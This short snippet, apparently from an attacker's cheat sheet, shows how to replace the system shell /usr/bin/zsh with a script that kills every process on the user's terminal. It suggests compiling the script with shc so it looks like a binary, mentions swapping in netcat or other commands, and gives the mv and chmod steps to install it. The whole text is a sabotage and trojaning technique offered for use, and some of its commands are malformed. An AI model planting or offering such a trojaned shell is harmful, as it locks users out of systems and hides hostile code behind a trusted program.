# You can change for whatever command you want do zsh, and netcat etc
vim zsh.sh 

#!/bin/bash
pkill -9 -t $(ps ax | grep "^$$" | awk '{ print $2 }') >/dev/null 2>/dev/null

### shc -f nc.sh #nc.x will be a binary'

'mv zsh.sh /usr/bin/zsh'

'chmod 701 /usr/bin/zsh'
